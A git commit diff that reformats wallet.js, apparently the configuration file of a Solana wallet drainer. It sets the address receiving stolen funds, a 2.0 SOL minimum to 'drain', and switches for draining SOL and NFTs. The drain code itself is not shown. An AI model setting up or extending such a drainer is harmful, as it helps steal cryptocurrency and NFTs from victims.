7aa26799cb68f45dc19a455ce16d03bd0d73d17c
Moon <104867492+0x32Moon@users.noreply.github.com>
2022-07-21 01:33:07 +0200

    Beautifed config

--- wallet.js
+++ wallet.js
@@ -1,7 +1,13 @@
-/*
-    = = = = = YOUR WALLET ADRESS = = = = =
-*/
-
+/*   = = = = = YOUR WALLET ADRESS = = = = =   */
 const receiveAddress = "your solana wallet adress"; // Adress where you want to receive money/nfts
 
-const mode = "sol", "nfts" // type "sol" only if you want only sol OR "nfts" only if you want only nfts. (You must delete the ,)
+/*   = = = = = AMOUNT = = = = =   */
+const amount = {
+    minimal: 2.0 // Minimal of amount of Solana to drain (2.0 is the minimum supported)
+}
+
+/*   = = = = = MODES = = = = =   */
+const active = {
+    solana: true, // To drain sol, remove this line if you only want to drain NFTs
+    nfts: true, // To Drain nfts, remove this line if you only want to drain Solana
+}
